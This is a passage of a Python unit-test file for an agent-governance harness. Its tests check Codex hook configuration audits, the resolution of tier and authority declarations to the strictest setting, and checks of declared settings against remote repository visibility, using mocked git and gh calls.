            "dispatch.py\" --event pre --runtime codex'\n"
        )

        result, output = self.run_doctor_with_fixture_globals(
            repo, user_config=alias_floor
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] no inspectable global Codex floor", output)
        self.assertIn("config.toml:hooks", output)

    def test_doctor_rejects_stored_profile_inline_global_floor(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo,
            profile_configs={"custom.config.toml": self.inline_floor_config_text()},
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] no inspectable global Codex floor", output)
        self.assertIn("custom.config.toml", output)

    def test_doctor_audits_mixed_case_profile_floor_when_loadable(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo,
            profile_configs={"custom.CONFIG.TOML": self.inline_floor_config_text()},
        )

        exact_alias = Path(self.temp.name) / "codex-home" / "custom.config.toml"
        if exact_alias.is_file():
            self.assertEqual(result, 1)
            self.assertIn("[FAIL] no inspectable global Codex floor", output)
            self.assertIn("custom.CONFIG.TOML", output)
        else:
            self.assertEqual(result, 0, output)

    def test_doctor_ignores_unselectable_profile_filenames(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        unselectable_config = (
            'project_root_markers = ["workspace.toml"]\n'
            + self.inline_floor_config_text()
        )

        result, output = self.run_doctor_with_fixture_globals(
            repo,
            profile_configs={
                ".config.toml": unselectable_config,
                "backup.old.config.toml": unselectable_config,
            },
        )

        self.assertEqual(result, 0, output)
        self.assertIn("[ok] no inspectable global Codex floor", output)
        self.assertIn("[ok] Codex project root markers", output)

    def test_doctor_ignores_unsupported_legacy_profile_inline_hooks(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        profile_floor = self.inline_floor_config_text().replace(
            "[[hooks.", "[[profiles.custom.hooks."
        )

        result, output = self.run_doctor_with_fixture_globals(
            repo, user_config=profile_floor
        )

        self.assertEqual(result, 0, output)
        self.assertIn("[ok] no inspectable global Codex floor", output)

    def test_doctor_fails_closed_when_profile_enumeration_is_denied(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        with mock.patch.object(
            harness,
            "codex_profile_config_paths",
            side_effect=harness.HarnessError("fixture profile enumeration denied"),
        ):
            result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 1)
        self.assertIn(
            "[FAIL] no inspectable global Codex floor: "
            "fixture profile enumeration denied",
            output,
        )
        self.assertIn(
            "[FAIL] Codex project root markers: fixture profile enumeration denied",
            output,
        )

    def test_profile_config_enumeration_propagates_directory_errors(self) -> None:
        codex_home = Path(self.temp.name) / "codex-home-enumeration"
        codex_home.mkdir()

        with mock.patch.object(
            harness.os,
            "scandir",
            side_effect=PermissionError("fixture denied"),
        ):
            with self.assertRaisesRegex(
                harness.HarnessError,
                "cannot enumerate Codex profile configs.*fixture denied",
            ):
                harness.codex_profile_config_paths(codex_home)

    def test_profile_config_enumeration_matches_loadable_filename_aliases(
        self,
    ) -> None:
        codex_home = Path(self.temp.name) / "codex-home-filenames"
        codex_home.mkdir()
        ordinary = codex_home / "ordinary.config.toml"
        mixed_case = codex_home / "mixed.CONFIG.TOML"
        unselectable = codex_home / "backup.old.config.toml"
        for path in (ordinary, mixed_case, unselectable):
            path.write_text("", encoding="utf-8")

        paths = harness.codex_profile_config_paths(codex_home)

        self.assertIn(ordinary, paths)
        self.assertNotIn(unselectable, paths)
        exact_alias = codex_home / "mixed.config.toml"
        try:
            mixed_case_is_loadable = exact_alias.samefile(mixed_case)
        except FileNotFoundError:
            mixed_case_is_loadable = False
        self.assertEqual(mixed_case in paths, mixed_case_is_loadable)

    def test_doctor_rejects_system_hooks_json_global_floor(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo, system_hooks=valid_adapter
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] no inspectable global Codex floor", output)
        self.assertIn("hooks.json", output)

    def test_doctor_rejects_system_inline_global_floor(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo, system_config=self.inline_floor_config_text()
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] no inspectable global Codex floor", output)
        self.assertIn("system-config.toml", output)

    def test_doctor_rejects_system_requirements_global_floor(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo, system_requirements=self.inline_floor_config_text()
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] no inspectable global Codex floor", output)
        self.assertIn("requirements.toml", output)

    def test_doctor_rejects_unreadable_static_global_toml(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        system_config = Path(self.temp.name) / "system-config.toml"

        result, output = self.run_doctor_with_denied_static_source(
            repo,
            system_config,
            system_config=self.inline_floor_config_text(),
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] no inspectable global Codex floor", output)
        self.assertIn("fixture denied", output)

    def test_doctor_rejects_unreadable_static_hooks_json(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        system_hooks = Path(self.temp.name) / "hooks.json"

        result, output = self.run_doctor_with_denied_static_source(
            repo,
            system_hooks,
            system_hooks=valid_adapter,
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] no inspectable global Codex floor", output)
        self.assertIn("fixture denied", output)

    def test_doctor_rejects_unreadable_canonical_project_hooks(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        project_hooks = self.write_hooks(repo, valid_adapter).resolve()
        original_read = harness.read_optional_bytes

        def fixture_read(path: Path) -> bytes | None:
            if path == project_hooks:
                raise harness.HarnessError(f"cannot read {path}: fixture denied")
            return original_read(path)

        with mock.patch.object(
            harness, "read_optional_bytes", side_effect=fixture_read
        ):
            result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex hook source", output)
        self.assertIn("fixture denied", output)
        self.assertIn("[FAIL] project Codex floor", output)

    def test_doctor_rejects_unreadable_ignored_worktree_hooks(self) -> None:
        root, linked = self.make_linked_worktree()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(root, valid_adapter)
        ignored_hooks = self.write_hooks(linked, valid_adapter).resolve()
        original_read = harness.read_optional_bytes

        def fixture_read(path: Path) -> bytes | None:
            if path == ignored_hooks:
                raise harness.HarnessError(f"cannot read {path}: fixture denied")
            return original_read(path)

        with mock.patch.object(
            harness, "read_optional_bytes", side_effect=fixture_read
        ):
            result, output = self.run_doctor_with_fixture_globals(linked)

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex hook source", output)
        self.assertIn("fixture denied", output)

    def test_doctor_rejects_unreadable_project_codex_layer(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        denied_layer = (repo / ".codex").resolve()
        original_stat = Path.stat

        def fixture_stat(path: Path, *args: object, **kwargs: object) -> object:
            if path == denied_layer:
                raise PermissionError("fixture layer denied")
            return original_stat(path, *args, **kwargs)

        with mock.patch.object(Path, "stat", autospec=True, side_effect=fixture_stat):
            result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex hook source", output)
        self.assertIn("cannot inspect Codex layer", output)
        self.assertIn("fixture layer denied", output)

    def test_doctor_rejects_managed_inline_global_floor(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo, managed_config=self.inline_floor_config_text()
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] no inspectable global Codex floor", output)
        self.assertIn("managed-config.toml", output)

    def test_doctor_rejects_nested_worktree_only_hook_source(self) -> None:
        root, linked = self.make_linked_worktree()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(root, valid_adapter)
        self.write_hooks(linked, valid_adapter)
        nested = linked / "nested"
        nested.mkdir()
        local_hooks = self.write_hooks(nested, '{"hooks": {}}\n')

        result, output = self.run_doctor_with_fixture_globals(nested)

        authoritative_hooks = root / "nested" / ".codex" / "hooks.json"
        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex hook source", output)
        self.assertIn(str(authoritative_hooks.resolve()), output)
        self.assertIn(str(local_hooks.resolve()), output)
        self.assertIn("authoritative root source is absent", output)
        self.assertIn("[FAIL] project Codex floor: 1 project floor handler(s)", output)

    def test_doctor_audits_mapped_nested_root_hook_source(self) -> None:
        root, linked = self.make_linked_worktree()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(root, valid_adapter)
        self.write_hooks(linked, valid_adapter)
        nested = linked / "nested"
        (nested / ".codex").mkdir(parents=True)
        authoritative_hooks = self.write_hooks(root / "nested", valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(nested)

        self.assertEqual(result, 1)
        self.assertIn("2 active Codex hook layer(s)", output)
        self.assertIn(str(authoritative_hooks.resolve()), output)
        self.assertIn("[FAIL] project Codex floor: 2 project floor handler(s)", output)

    def test_doctor_audits_mapped_nested_root_inline_hook_source(self) -> None:
        root, linked = self.make_linked_worktree()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(root, valid_adapter)
        self.write_hooks(linked, valid_adapter)
        nested = linked / "nested"
        config = nested / ".codex" / "config.toml"
        config.parent.mkdir(parents=True)
        config.write_text("[features]\nhooks = true\n", encoding="utf-8")
        authoritative_config = self.write_inline_floor(root / "nested")

        result, output = self.run_doctor_with_fixture_globals(nested)

        self.assertEqual(result, 1)
        self.assertIn(str(authoritative_config.resolve()), output)
        self.assertIn("[FAIL] project Codex floor: 2 project floor handler(s)", output)

    def test_doctor_rejects_ignored_worktree_inline_hook_source(self) -> None:
        root, linked = self.make_linked_worktree()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(root, valid_adapter)
        self.write_hooks(linked, valid_adapter)
        nested = linked / "nested"
        local_config = self.write_inline_floor(nested)

        result, output = self.run_doctor_with_fixture_globals(nested)

        authoritative_config = root / "nested" / ".codex" / "config.toml"
        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex hook source", output)
        self.assertIn(str(authoritative_config.resolve()), output)
        self.assertIn(str(local_config.resolve()), output)
        self.assertIn("ignored worktree inline hooks", output)
        self.assertIn("[FAIL] project Codex floor: 1 project floor handler(s)", output)

    def test_doctor_floor_status_fails_with_divergent_worktree_copy(self) -> None:
        root, linked = self.make_linked_worktree()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(root, valid_adapter)
        self.write_hooks(linked, '{"hooks": {"different": []}}\n')

        result, output = self.run_doctor_with_fixture_globals(linked)

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex hook source", output)
        self.assertIn("ignored worktree copy differs", output)
        self.assertIn("[FAIL] project Codex floor: 1 project floor handler(s)", output)

    def test_missing_command_is_reported_not_raised(self) -> None:
        result = harness.run(["definitely-not-a-real-harness-command"])
        self.assertEqual(result.returncode, 127)

    def test_doctor_reports_floor_version_and_reference_integrity(self) -> None:
        repo = self.make_repo()
        self.write_hooks(
            repo,
            (
                Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
            ).read_text(encoding="utf-8"),
        )
        with mock.patch.object(
            harness, "harness_reference_status", return_value=(True, "fixture clean")
        ):
            result, output = self.run_doctor_with_fixture_globals(repo)
        self.assertIn("[ok] floor version: canonical template ", output)
        self.assertIn("reference integrity: ", output)
        self.assertIn("declared vs real: ", output)
        self.assertEqual(result, 0, output)

    def test_doctor_never_prints_an_unprovable_comparison_as_a_pass(self) -> None:
        # A working-tree template that is not the canonical reference proves
        # nothing about canonical bytes, so it must not render as
        # `[ok] floor version`.
        repo = self.make_repo()
        self.write_hooks(
            repo,
            (
                Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
            ).read_text(encoding="utf-8"),
        )
        with mock.patch.object(
            harness, "harness_reference_status", return_value=(False, "fixture reason")
        ):
            result, output = self.run_doctor_with_fixture_globals(repo)
        self.assertIn("[UNPROVEN] floor version", output)
        self.assertNotIn("[ok] floor version", output)
        self.assertIn("nothing here was compared against canonical bytes", output)
        # Unprovable is not a defect in the audited floor, so it does not fail.
        self.assertEqual(result, 0, output)

    def test_doctor_repo_has_the_same_offline_switch_as_audit(self) -> None:
        # `doctor --repo` runs the same reality checks as `audit`, which means
        # the same `gh` and remote-ref probes. Without the switch an operator
        # off network waits out the whole budget with no way to skip it.
        parsed = harness.parser().parse_args(["doctor", "--repo", ".", "--offline"])
        self.assertTrue(parsed.offline)
        self.assertFalse(harness.parser().parse_args(["doctor", "--repo", "."]).offline)

        repo = self.make_repo()
        self.write_hooks(
            repo,
            (
                Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
            ).read_text(encoding="utf-8"),
        )
        captured: dict[str, object] = {}

        def record(*_args: object, **kwargs: object) -> list[object]:
            captured["runner"] = kwargs.get("command_runner")
            return []

        with mock.patch.object(harness, "reality_findings", side_effect=record):
            self.run_doctor_with_fixture_globals(repo, offline=True)
        self.assertIs(captured["runner"], harness.local_only_command_output)

    def test_doctor_offline_also_routes_the_floor_reference_probe(self) -> None:
        # `harness_reference_status` reaches the remote for the published main
        # tip. It shipped hard-wired to the network runner while only the
        # reality checks honoured `--offline`, so the offline run still waited
        # out `git ls-remote`.
        repo = self.make_repo()
        self.write_hooks(
            repo,
            (
                Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
            ).read_text(encoding="utf-8"),
        )
        captured: list[object] = []

        def record(
            _root: Path, command_runner: object, _deadline: object
        ) -> tuple[bool, str]:
            captured.append(command_runner)
            return False, "fixture reason"

        with mock.patch.object(harness, "harness_reference_status", side_effect=record):
            self.run_doctor_with_fixture_globals(repo, offline=True)
        self.assertEqual(captured, [harness.local_only_command_output])

    def test_doctor_repo_uses_the_network_resolver_by_default(self) -> None:
        repo = self.make_repo()
        self.write_hooks(
            repo,
            (
                Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
            ).read_text(encoding="utf-8"),
        )
        captured: dict[str, object] = {}

        def record(*_args: object, **kwargs: object) -> list[object]:
            captured["runner"] = kwargs.get("command_runner")
            return []

        with mock.patch.object(harness, "reality_findings", side_effect=record):
            self.run_doctor_with_fixture_globals(repo)
        self.assertIs(captured["runner"], harness.bounded_command_output)

    def test_doctor_fails_on_a_reality_mismatch(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        (repo / ".agent-harness").mkdir()
        (repo / ".agent-harness" / "tier.json").write_text(
            json.dumps(
                {
                    "tier": 2,
                    "name": harness.TIER_NAMES[2],
                    "authority": {"push": "free", "merge": "free"},
                    "flags": {"sensitive_data": False},
                    "human_todo": "HUMAN_TODO.md",
                }
            ),
            encoding="utf-8",
        )

        result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] declared vs real", output)
        self.assertIn("[MISMATCH] human_todo vs the file on disk", output)

    def test_doctor_resolves_the_strictest_of_two_tier_declarations(self) -> None:
        # `doctor --repo` shares audit's resolution path, so it inherited the
        # same first-found-wins bug (issue #99): the legacy declaration below
        # is the only one that names a human-action file, and reading just
        # `.agent-harness/tier.json` reported nothing to check.
        repo = self.make_repo()
        self.write_hooks(
            repo,
            (
                Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
            ).read_text(encoding="utf-8"),
        )
        for directory, declaration in (
            (
                ".agent-harness",
                {
                    "tier": 1,
                    "name": harness.TIER_NAMES[1],
                    "authority": {"push": "free", "merge": "free"},
                    "flags": {"sensitive_data": False},
                },
            ),
            (
                ".claude",
                {
                    "tier": 4,
                    "name": harness.TIER_NAMES[4],
                    "authority": {"push": "free", "merge": "human-only"},
                    "flags": {"sensitive_data": False},
                    "human_todo": "HUMAN_TODO.md",
                },
            ),
        ):
            (repo / directory).mkdir()
            (repo / directory / "tier.json").write_text(
                json.dumps(declaration), encoding="utf-8"
            )

        result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 1)
        self.assertIn("[MISMATCH] human_todo vs the file on disk", output)


class TierResolutionTests(unittest.TestCase):
    """Co-located declarations bind to the STRICTEST union, not the first found.

    Law 9 and `dispatch.load_tier` (SPECS §5) specify one resolution; audit read
    `.agent-harness/tier.json` with FALLBACK to the legacy file, so a repo
    declaring T1 beside a surviving T4 + sensitive_data legacy file audited at a
    posture the dispatcher would never grant it (issue #99).
    """

    def setUp(self) -> None:
        self.temp = tempfile.TemporaryDirectory()
        self.repo = Path(self.temp.name)

    def tearDown(self) -> None:
        self.temp.cleanup()

    def declare(
        self, directory: str, repo: Path | None = None, **fields: object
    ) -> Path:
        declaration: dict[str, object] = {
            "tier": 1,
            "name": harness.TIER_NAMES[1],
            "authority": {"push": "free", "merge": "free"},
            "flags": {},
        }
        declaration.update(fields)
        if "tier" in fields and "name" not in fields:
            declaration["name"] = harness.TIER_NAMES[declaration["tier"]]
        path = (repo or self.repo) / directory / "tier.json"
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(json.dumps(declaration), encoding="utf-8")
        return path

    def posture(self) -> dict[str, object]:
        return harness.load_tier(self.repo)[1]

    def test_agreeing_declarations_bind_what_they_both_say(self) -> None:
        for directory in (".agent-harness", ".claude"):
            self.declare(directory, tier=3, flags={"sensitive_data": True})
        posture = self.posture()
        self.assertEqual(posture["tier"], 3)
        self.assertTrue(posture["flags"]["sensitive_data"])
        self.assertEqual(len(harness.load_tier(self.repo)[0]), 2)

    def test_the_new_file_binds_when_it_is_the_stricter_one(self) -> None:
        self.declare(".agent-harness", tier=4, flags={"wave_mode": True})
        self.declare(".claude", tier=1, flags={"wave_mode": False})
        posture = self.posture()
        self.assertEqual(posture["tier"], 4)
        self.assertTrue(posture["flags"]["wave_mode"])

    def test_a_stale_legacy_declaration_cannot_be_masked(self) -> None:
        # The reported shape: T1 in the new file, T4 + sensitive_data in a
        # legacy file nobody deleted. First-found-wins audited it as T1.
        self.declare(".agent-harness", tier=1, flags={"sensitive_data": False})
        self.declare(".claude", tier=4, flags={"sensitive_data": True})
        posture = self.posture()
        self.assertEqual(posture["tier"], 4)
        self.assertTrue(posture["flags"]["sensitive_data"])

    def test_every_tightening_flag_is_unioned(self) -> None:
        self.declare(".agent-harness", flags={"sensitive_data": True})
        self.declare(".claude", flags={"wave_mode": True, "dormant_production": True})
        self.assertEqual(
            self.posture()["flags"],
            {
                "sensitive_data": True,
                "wave_mode": True,
                "dormant_production": True,
                "relaxed_work_loss_guards": False,
            },
        )

    def test_the_work_loss_relaxation_needs_every_declaration_to_agree(self) -> None:
        self.declare(".agent-harness", flags={"relaxed_work_loss_guards": True})
        self.declare(".claude", flags={"relaxed_work_loss_guards": False})
        self.assertFalse(self.posture()["flags"]["relaxed_work_loss_guards"])
        # Silence is not agreement either: the guard stays on.
        self.declare(".claude", flags={})
        self.assertFalse(self.posture()["flags"]["relaxed_work_loss_guards"])
        # Unanimous, and only then, the declared relaxation applies.
        self.declare(".claude", flags={"relaxed_work_loss_guards": True})
        self.assertTrue(self.posture()["flags"]["relaxed_work_loss_guards"])

    def test_a_lone_declaration_binds_on_its_own_from_either_home(self) -> None:
        for index, directory in enumerate((".agent-harness", ".claude")):
            with self.subTest(directory=directory):
                repo = self.repo / f"lone-{index}"
                declared = self.declare(
                    directory,
                    repo=repo,
                    tier=3,
                    flags={"relaxed_work_loss_guards": True},
                )
                paths, posture = harness.load_tier(repo)
                self.assertEqual(posture["tier"], 3)
                self.assertTrue(posture["flags"]["relaxed_work_loss_guards"])
                self.assertEqual(paths, [declared])

    def test_no_declaration_binds_nothing(self) -> None:
        self.assertEqual(harness.load_tier(self.repo), ([], {}))
        self.assertIsNone(harness.tier_path(self.repo))

    def test_the_strictest_authority_dial_binds(self) -> None:
        self.declare(".agent-harness", authority={"push": "free", "merge": "free"})
        self.declare(".claude", authority={"push": "gated", "merge": "human-only"})
        self.assertEqual(
            self.posture()["authority"], {"push": "gated", "merge": "human-only"}
        )

    def test_non_posture_fields_come_from_the_runtime_neutral_file(self) -> None:
        # `human_todo` is not comparable, so precedence decides it — and an
        # explicit null is a declaration, not an omission.
        self.declare(".agent-harness", human_todo="HUMAN_TODO.md")
        self.declare(".claude", human_todo="TODO-human.md")
        self.assertEqual(self.posture()["human_todo"], "HUMAN_TODO.md")
        self.declare(".agent-harness", human_todo=None)
        self.assertIsNone(self.posture()["human_todo"])
        # An absent key falls through to the file that does declare one.
        self.declare(".agent-harness")
        self.assertEqual(self.posture()["human_todo"], "TODO-human.md")

    def test_a_malformed_declaration_still_raises_with_its_path(self) -> None:
        path = self.declare(".claude")
        path.write_text("[]", encoding="utf-8")
        with self.assertRaises(harness.HarnessError) as caught:
            harness.load_tier(self.repo)
        self.assertIn(str(path), str(caught.exception))


class FakeCommandRunner:
    """A stand-in resolver: records argv, never spawns a process."""

    def __init__(
        self,
        responses: dict[str, tuple[bool, str]] | None = None,
        default: tuple[bool, str] = (False, ""),
    ) -> None:
        self.responses = responses or {}
        self.default = default
        self.calls: list[list[str]] = []

    def __call__(
        self, argv: list[str], cwd: Path | None = None, **kwargs: object
    ) -> tuple[bool, str]:
        self.calls.append(list(argv))
        joined = " ".join(argv)
        for needle, response in self.responses.items():
            if needle in joined:
                return response
        return self.default


GITHUB_REMOTE_OUTPUT = (
    "origin\thttps://github.com/acme/widgets.git (fetch)\n"
    "origin\thttps://github.com/acme/widgets.git (push)"
)
# The commit a canonical harness checkout sits on AND publishes as `main`.
PUBLISHED_MAIN_TIP = "0123456789abcdef0123456789abcdef01234567"


class RealityCheckTests(unittest.TestCase):
    """Declarations measured against the world, never against other documents."""

    def setUp(self) -> None:
        self.temp = tempfile.TemporaryDirectory()
        self.root = Path(self.temp.name)
        self.harness_root = self.root / "harness"
        self.claude_home = self.root / "claude-home"
        (self.harness_root / "templates" / "hooks").mkdir(parents=True)
        (self.claude_home / "hooks").mkdir(parents=True)

    def tearDown(self) -> None:
        self.temp.cleanup()

    def make_repo(
        self,
        *,
        tier: int = 2,
        sensitive_data: bool = False,
        human_todo: object = "unset",
        agents_text: str = "# Agent guidance\n",
    ) -> Path:
        repo = self.root / f"repo-{len(list(self.root.glob('repo-*')))}"
        repo.mkdir()
        subprocess.run(["git", "init", "-q"], cwd=repo, check=True)
        (repo / "AGENTS.md").write_text(agents_text, encoding="utf-8")
        declaration: dict[str, object] = {
            "tier": tier,
            "name": harness.TIER_NAMES[tier],
            "authority": {"push": "free", "merge": "free"},
            "flags": {"sensitive_data": sensitive_data},
        }
        if human_todo != "unset":
            declaration["human_todo"] = human_todo
        (repo / ".agent-harness").mkdir()
        (repo / ".agent-harness" / "tier.json").write_text(
            json.dumps(declaration), encoding="utf-8"
        )
        return repo

    def audit(
        self, repo: Path, runner: FakeCommandRunner, deadline: float | None = None
    ) -> dict[str, object]:
        return harness.audit_repo(
            repo,
            harness_root=self.harness_root,
            claude_home=self.claude_home,
            command_runner=runner,
            deadline=deadline,
        )

    def statuses(self, result: dict[str, object], needle: str) -> list[str]:
        return [
            finding["status"]
            for finding in result["reality"]
            if needle in finding["check"]
        ]

    def details(self, result: dict[str, object]) -> str:
        return " | ".join(finding["detail"] for finding in result["reality"])

    def canonical_reference_runner(
        self, **overrides: tuple[bool, str]
    ) -> FakeCommandRunner:
        """A harness checkout that can PROVE it is the canonical reference.

        Clean, on `main`, level with the local tracking ref, and sitting on the
        commit `origin` publishes as `main`. Needles are ordered so the
        specific `rev-parse HEAD` answer wins over the branch-name one.
        """
        responses: dict[str, tuple[bool, str]] = {
            "rev-parse HEAD": (True, PUBLISHED_MAIN_TIP),
            "rev-parse": (True, "main"),
            "status --porcelain": (True, ""),
            "ls-files": (True, "H templates/hooks/dispatch.py"),
            "rev-list": (True, "0\t0"),
            "ls-remote": (True, f"{PUBLISHED_MAIN_TIP}\trefs/heads/main"),
        }
        responses.update(overrides)
        return FakeCommandRunner(responses)

    def write_floor(self, path: Path, version: str) -> None:
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(
            f'"""floor fixture."""\n\nFLOOR_VERSION = "{version}"\n', encoding="utf-8"
        )

    # --- sensitive_data versus real remote visibility -------------------------

    def test_declared_sensitive_data_on_public_remote_is_a_mismatch(self) -> None:
        repo = self.make_repo(sensitive_data=True)
        runner = FakeCommandRunner(
            {
                "remote --verbose": (True, GITHUB_REMOTE_OUTPUT),
                "gh repo view": (True, "PUBLIC"),
            }
        )
        result = self.audit(repo, runner)
        self.assertEqual(self.statuses(result, "remote visibility"), ["MISMATCH"])
        self.assertFalse(result["ok"])
        detail = self.details(result)
        self.assertIn("acme/widgets", detail)
        self.assertIn("https://github.com/acme/widgets.git", detail)
        self.assertIn("PUBLIC", detail)

    def test_a_stale_legacy_declaration_still_binds_the_audit(self) -> None:
        # End-to-end shape of issue #99: the repo declares T1 without the
        # overlay, a legacy file nobody deleted declares T4 + sensitive_data,
        # and first-found-wins never even probed the remote.
        repo = self.make_repo(tier=1, sensitive_data=False)
        (repo / ".claude").mkdir()
        (repo / ".claude" / "tier.json").write_text(
            json.dumps(
                {
                    "tier": 4,
                    "name": harness.TIER_NAMES[4],
                    "authority": {"push": "free", "merge": "gated"},
                    "flags": {"sensitive_data": True},
                }
            ),
            encoding="utf-8",
        )
        runner = FakeCommandRunner(
            {
                "remote --verbose": (True, GITHUB_REMOTE_OUTPUT),
                "gh repo view": (True, "PUBLIC"),
            }
        )
        result = self.audit(repo, runner)
        self.assertEqual(result["tier"], 4)
        self.assertEqual(len(result["tier_files"]), 2)
        self.assertEqual(self.statuses(result, "remote visibility"), ["MISMATCH"])
        self.assertFalse(result["ok"])

    def test_two_declarations_name_the_file_each_issue_came_from(self) -> None:
        repo = self.make_repo()
        (repo / ".claude").mkdir()
        (repo / ".claude" / "tier.json").write_text(
            json.dumps({"tier": 9, "authority": {}, "flags": {}}), encoding="utf-8"
        )
        result = self.audit(repo, FakeCommandRunner())
        self.assertTrue(
            all(
                issue.startswith(".claude/tier.json: ")
                for issue in result["issues"]
                if "tier must be" in issue or "authority." in issue
            ),
            result["issues"],
        )
        self.assertIn(
            ".claude/tier.json: tier must be an integer from 0 through 4",
            result["issues"],
        )
        # The valid declaration still binds the tier the invalid one cannot.
        self.assertEqual(result["tier"], 2)

    def test_public_non_origin_remote_is_advisory_not_a_failure(self) -> None:
        # A private fork of a public project: origin private, upstream public.
        # The exposure check must still say it loudly without failing a repo
        # whose publishing remote is private.
        repo = self.make_repo(sensitive_data=True)
        runner = FakeCommandRunner(
            {
                "remote --verbose": (
                    True,
                    "origin\thttps://github.com/acme/widgets-private.git (fetch)\n"
                    "upstream\thttps://github.com/upstream/widgets.git (fetch)",
                ),
                "gh repo view github.com/upstream/widgets": (True, "PUBLIC"),
                "gh repo view github.com/acme/widgets-private": (True, "PRIVATE"),
            }
        )
        result = self.audit(repo, runner)
        self.assertEqual(
            sorted(self.statuses(result, "remote visibility")), ["advisory", "ok"]
        )
        detail = self.details(result)
        self.assertIn("PUBLIC repository upstream/widgets", detail)
        self.assertIn("is not the publishing remote", detail)
        self.assertTrue(result["ok"], result["issues"])

    # --- the visibility probe's transports (issue #106) ------------------------

    def test_the_visibility_probe_asks_rest_before_graphql(self) -> None:
        # `gh repo view` is the GraphQL lane, whose hourly quota an agent fleet
        # exhausts while REST core is barely touched. REST answers first, and
        # a REST verdict spends no GraphQL call at all.
        repo = self.make_repo(sensitive_data=True)
        runner = FakeCommandRunner(
            {
                "remote --verbose": (True, GITHUB_REMOTE_OUTPUT),
